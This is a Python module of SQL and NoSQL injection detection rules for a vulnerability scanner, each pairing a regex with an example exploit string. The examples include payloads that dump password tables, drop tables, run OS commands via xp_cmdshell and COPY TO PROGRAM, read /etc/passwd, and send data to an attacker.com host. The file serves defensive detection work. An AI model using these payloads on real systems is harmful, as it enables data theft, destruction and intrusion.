"""
SQL Injection Patterns - Cross-language SQL vulnerability detection
"""

# ============================================================================
# SQL INJECTION PATTERNS (language agnostic)
# ============================================================================
SQL_PATTERNS = [
    # ----- UNION BASED -----
    {
        'id': 'sql_union_select',
        'name': 'SQL UNION-based Injection',
        'category': 'sqli',
        'severity': 'critical',
        'pattern': r'(?i)union\s+(all\s+)?select\s+',
        'description': 'UNION-based SQL injection allows data extraction',
        'exploit': "' UNION SELECT username,password FROM users--",
        'cwe': 'CWE-89',
    },
    
    # ----- STACKED QUERIES -----
    {
        'id': 'sql_stacked',
        'name': 'SQL Stacked Queries',
        'category': 'sqli',
        'severity': 'critical',
        'pattern': r';\s*(DROP|DELETE|UPDATE|INSERT|CREATE|ALTER|TRUNCATE)\s+',
        'description': 'Stacked queries allow multiple SQL statements',
        'exploit': "'; DROP TABLE users;--",
        'cwe': 'CWE-89',
    },
    
    # ----- BOOLEAN BASED -----
    {
        'id': 'sql_boolean_based',
        'name': 'SQL Boolean-based Blind Injection',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r"(?i)(and|or)\s+\d+\s*=\s*\d+",
        'description': 'Boolean-based blind SQL injection',
        'exploit': "' AND 1=1-- vs ' AND 1=2--",
        'cwe': 'CWE-89',
    },
    
    # ----- TIME BASED -----
    {
        'id': 'sql_time_based',
        'name': 'SQL Time-based Blind Injection',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(?i)(SLEEP|WAITFOR|BENCHMARK|PG_SLEEP|DBMS_LOCK\.SLEEP)\s*\(',
        'description': 'Time-based blind SQL injection',
        'exploit': "'; SLEEP(5);--",
        'cwe': 'CWE-89',
    },
    
    # ----- ERROR BASED -----
    {
        'id': 'sql_error_based',
        'name': 'SQL Error-based Injection',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(?i)(extractvalue|updatexml|xmltype|utl_inaddr|ctxsys\.drithsx)\s*\(',
        'description': 'Error-based SQL injection (Oracle/MySQL)',
        'exploit': "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
        'cwe': 'CWE-89',
    },
    
    # ----- OUT OF BAND -----
    {
        'id': 'sql_oob',
        'name': 'SQL Out-of-Band Injection',
        'category': 'sqli',
        'severity': 'critical',
        'pattern': r'(?i)(load_file|into\s+outfile|into\s+dumpfile|utl_http|httpuritype)\s*\(',
        'description': 'Out-of-band SQL injection (data exfiltration)',
        'exploit': "' UNION SELECT load_file('/etc/passwd')--",
        'cwe': 'CWE-89',
    },
    
    # ----- MYSQL SPECIFIC -----
    {
        'id': 'sql_mysql_comment',
        'name': 'MySQL Comment Injection',
        'category': 'sqli',
        'severity': 'medium',
        'pattern': r'/\*![\d]+',
        'description': 'MySQL version-specific comment execution',
        'exploit': "/*!50000SELECT*/ * FROM users",
        'cwe': 'CWE-89',
    },
    {
        'id': 'sql_mysql_functions',
        'name': 'MySQL Information Functions',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(?i)(@@version|@@datadir|database\(\)|user\(\)|current_user\(\))',
        'description': 'MySQL information disclosure functions',
        'exploit': "' UNION SELECT @@version--",
        'cwe': 'CWE-89',
    },
    
    # ----- MSSQL SPECIFIC -----
    {
        'id': 'sql_mssql_xp',
        'name': 'MSSQL Extended Stored Procedures',
        'category': 'sqli',
        'severity': 'critical',
        'pattern': r'(?i)(xp_cmdshell|xp_regread|xp_fileexist|xp_dirtree)\s*',
        'description': 'MSSQL xp_cmdshell allows OS command execution',
        'exploit': "; EXEC xp_cmdshell 'whoami';--",
        'cwe': 'CWE-89',
    },
    {
        'id': 'sql_mssql_openrowset',
        'name': 'MSSQL OPENROWSET',
        'category': 'sqli',
        'severity': 'critical',
        'pattern': r'(?i)OPENROWSET\s*\(',
        'description': 'MSSQL OPENROWSET for data access',
        'exploit': "SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker;uid=sa;pwd=pass','SELECT 1')",
        'cwe': 'CWE-89',
    },
    
    # ----- POSTGRESQL SPECIFIC -----
    {
        'id': 'sql_postgres_copy',
        'name': 'PostgreSQL COPY Command',
        'category': 'sqli',
        'severity': 'critical',
        'pattern': r'(?i)COPY\s+.*\s+(FROM|TO)\s+',
        'description': 'PostgreSQL COPY for file read/write',
        'exploit': "'; COPY (SELECT '') TO PROGRAM 'id';--",
        'cwe': 'CWE-89',
    },
    {
        'id': 'sql_postgres_functions',
        'name': 'PostgreSQL System Functions',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(?i)(pg_read_file|pg_ls_dir|pg_stat_file|lo_import|lo_export)\s*\(',
        'description': 'PostgreSQL file system access functions',
        'exploit': "SELECT pg_read_file('/etc/passwd')",
        'cwe': 'CWE-89',
    },
    
    # ----- ORACLE SPECIFIC -----
    {
        'id': 'sql_oracle_functions',
        'name': 'Oracle System Functions',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(?i)(dbms_java|utl_file|utl_http|dbms_metadata|dbms_scheduler)\.',
        'description': 'Oracle PL/SQL package abuse',
        'exploit': "exec utl_http.request('http://attacker.com/'||user)",
        'cwe': 'CWE-89',
    },
    
    # ----- NOSQL -----
    {
        'id': 'nosql_mongo_injection',
        'name': 'MongoDB NoSQL Injection',
        'category': 'nosql_injection',
        'severity': 'high',
        'pattern': r'\$(?:gt|gte|lt|lte|ne|in|nin|or|and|not|nor|exists|type|regex|where)',
        'description': 'MongoDB operator injection',
        'exploit': '{"$gt": ""}',
        'cwe': 'CWE-943',
    },
    {
        'id': 'nosql_mongo_where',
        'name': 'MongoDB $where Injection',
        'category': 'nosql_injection',
        'severity': 'critical',
        'pattern': r'\$where.*function\s*\(',
        'description': 'MongoDB $where JavaScript injection',
        'exploit': '{"$where": "function() { return true; }"}',
        'cwe': 'CWE-943',
    },
    {
        'id': 'nosql_redis',
        'name': 'Redis Command Injection',
        'category': 'nosql_injection',
        'severity': 'critical',
        'pattern': r'(?i)(CONFIG\s+SET|EVAL|SLAVEOF|DEBUG\s+SLEEP)',
        'description': 'Redis command injection',
        'exploit': 'CONFIG SET dir /var/www/html/',
        'cwe': 'CWE-943',
    },
    
    # ----- SECOND ORDER -----
    {
        'id': 'sql_second_order',
        'name': 'Second Order SQL Injection',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(?i)INSERT\s+INTO\s+.*VALUES\s*\([^)]*\+',
        'description': 'Potential second-order SQL injection',
        'exploit': "Store payload, retrieve and execute later",
        'cwe': 'CWE-89',
    },
    
    # ----- ORM BYPASS -----
    {
        'id': 'sql_orm_raw',
        'name': 'ORM Raw Query Bypass',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(?i)(raw|execute|executemany|cursor\.execute|connection\.execute)\s*\(',
        'description': 'Raw SQL bypassing ORM protections',
        'exploit': 'Standard SQL injection in raw queries',
        'cwe': 'CWE-89',
    },
]
